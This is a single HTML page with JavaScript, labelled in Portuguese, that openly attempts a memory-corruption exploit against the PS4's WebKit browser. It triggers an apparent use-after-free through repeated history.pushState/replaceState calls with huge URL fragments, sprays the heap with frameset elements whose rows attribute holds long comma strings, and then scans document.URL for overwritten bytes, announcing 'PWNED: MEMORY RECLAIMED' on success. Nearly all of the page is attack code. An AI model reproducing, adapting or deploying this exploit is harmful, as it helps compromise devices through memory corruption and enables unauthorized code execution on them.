<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Frameset Sweep Attack</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #111; color: #fff;
        text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 300px; overflow-y: scroll;}
    .success { color: #fff; background-color: #008800; padding: 5px; font-weight: bold;}
</style>
</head>
<body>
<h2>PS4 WebKit - Frameset Sweep (Carpet Bombing)</h2>
<div id="status">Aguardando comando...</div>

<button onclick="runSweepExploit()">INICIAR VARREDURA DE MEMÓRIA</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runSweepExploit() {
    logEl.innerHTML = "";
    keepAlive = []; // Reset
    statusEl.innerText = "Rodando...";

    // === FASE 1: TRIGGER UAF ===
    log("1. Disparando UAF (Criando o buraco)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        size += STEP;
        await sleep(2); // Mais rápido
    }
    
    await sleep(20);

    // === FASE 2: FRAMESET SWEEP ===
    // Alvo calculado: ~42.544 vírgulas.
    // Vamos varrer de 41.500 até 44.000 para cobrir qualquer padding do sistema.
    
    const START = 41500;
    const END = 44000;
    const STEP_SIZE = 16; // Incremento de 16 vírgulas (128 bytes) por vez
    
    statusEl.innerText = "2. Varrendo memória (Spraying)...";
    log(`Iniciando varredura: ${START} a ${END} vírgulas.`);
    log(`Cobrindo memória de: ${START*8} bytes a ${END*8} bytes.`);

    let current = START;
    let batch = 0;

    // Criamos uma "rampa" de alocações
    while(current < END) {
        try {
            // Cria a string de vírgulas
            let payload = ",".repeat(current);
            
            // Cria o frameset
            let f = document.createElement("frameset");
            f.rows = payload;
            keepAlive.push(f);
            
        } catch(e) {}
        
        current += STEP_SIZE;
        batch++;
        
        // Pequena pausa a cada 200 alocações para não travar o navegador
        if(batch % 200 === 0) {
            statusEl.innerText = `Spraying... (${current} / ${END})`;
            await sleep(10); 
        }
    }

    log(`Spray Completo! ${keepAlive.length} objetos criados.`);
    log("Aguardando estabilização...");
    await sleep(200);

    // === FASE 3: VERIFICAÇÃO ===
    statusEl.innerText = "3. Verificando sucesso...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Procura por qualquer coisa que NÃO seja 'V'
    // Se o frameset funcionou, a memória vai estar cheia de zeros e uns (estrutura binária)
    for(let i=2000; i<4000; i++) {
        if(url.charCodeAt(i) !== 0x56) { // 0x56 é 'V'
            changed = true;
            // Pega uma amostra do hex
            for(let k=0; k<16; k++) {
                let code = url.charCodeAt(i+k);
                sample += code.toString(16).padStart(2,'0') + " ";
            }
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!", "success");
        log("A memória foi sobrescrita!");
        log("Dados brutos encontrados: " + sample);
        log("Isso confirma que temos controle do objeto.");
        statusEl.innerText = "PWNED: MEMORY RECLAIMED";
        statusEl.style.color = "#0ff";
    } else {
        log("Falha: Ainda vendo apenas 'V'.");
        log("O buraco pode ter sido fechado rápido demais ou o range ainda é pequeno.");
    }
}
</script>
</body>
</html>
